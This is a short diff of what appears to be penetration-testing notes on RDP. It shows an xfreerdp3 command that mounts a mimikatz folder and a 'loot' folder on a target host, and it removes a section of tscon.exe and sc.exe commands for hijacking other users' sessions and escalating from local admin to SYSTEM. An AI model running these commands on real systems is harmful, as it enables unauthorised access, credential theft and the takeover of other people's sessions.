@@ -13,19 +13,6 @@ Also called "Terminal Services".
 mkdir "$HOME/my_data/loot"; xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /drive:'/usr/share/windows-resources/mimikatz/x64',share /drive:"$HOME/my_data/loot",loot /v:<TARGET> /d:<DOMAIN> /u:<USER> /p:'<PASSWORD>'
 ```
 
-# Hijack Session
-
-```bash
-# Impersonate other logged-in user
-# NOTE: needs SYSTEM
-query.exe user
-tscon.exe <SESSION_ID> /dest:<SESSION_NAME>
-
-# Local Admin => SYSTEM
-sc.exe create sessionhijack binpath= "cmd.exe /k tscon.exe <SESSION_ID> /dest:<SESSION_NAME>"
-net.exe start sessionhijack
-```
-
 # Enable RDP
 
 ```bash
